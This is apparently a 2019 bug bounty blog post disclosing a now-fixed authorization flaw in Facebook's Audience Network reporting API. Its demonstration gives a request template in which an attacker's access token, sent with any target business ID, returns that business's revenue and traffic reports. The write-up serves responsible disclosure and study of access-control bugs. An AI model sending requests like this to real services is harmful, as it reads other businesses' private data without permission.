---
id: 214
title: 'Export Facebook audience network reports of any business'
date: '2019-02-12T14:34:08+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=214'
categories:
    - Uncategorized
---

This bug could be exploited by a malicious user to generate reports about audience network for any Facebook business.

  
**Description**

  
When making the API call to generate the report, there is no checking if the user making the request has permissions in the selcted business \[Checking access_token permissions\].   
According to <https://developers.facebook.com/docs/audience-network/reporting-api> , the API request should be like this   
https://graph.facebook.com/&lt;API_VERSION&gt;/&lt;APP_ID|BUSINESS_ID|PROPERTY_ID&gt;/adnetworkanalytics/ with selected metrics, filters and breakdowns.  
I noticed that if i provide an id of an app/property which i don’t have permissions in , i get an error but if i provide a BUSINESS_ID i get a valid response with a query_id to be used later to get the data.

  
**Demonstration**

  
First the attacker sends a POST request to :

```
https://graph.facebook.com/v3.0/{TARGET_BUSINESS}/adnetworkanalytics?access_token={ATTACKER_ACCESS_TOKEN}


aggregation_period=day
&breakdowns=["property","app","placement","country","platform","display_format"]&filters=[{"field":"delivery_method","operator":"IN","values":["standard"]}]
&metrics=["fb_ad_network_cpm","fb_ad_network_ctr","fb_ad_network_show_rate","fb_ad_network_filled_request","fb_ad_network_imp","fb_ad_network_click","fb_ad_network_request","fb_ad_network_revenue","fb_ad_network_fill_rate"]
&ordering_column=metric
&since={EPOCH_FORMAT_DATE}
&until={EPOCH_FORMAT_DATE}
```

  
The response to this request should returns a “query_id” and a redirect link where i can get the generated file containing the exported data.  
  
**Impact**  
  
An attacker could download the audience network reports for another business which he doesn’t have permission in.  
  
**Timeline**  
  
Jan 9, 2019— Report Sent  
Jan 9, 2019—Clarification requested by Facebook  
Jan 9, 2019 — Clarification sent  
Jan 9, 2019—Clarification requested by Facebook  
Jan 9, 2019— Clarification sent  
Jan 10, 2019 — Acknowledged by Facebook  
Feb 12, 2019 — Fixed by Facebook  
Feb 12, 2019 — Bounty Awarded by Facebook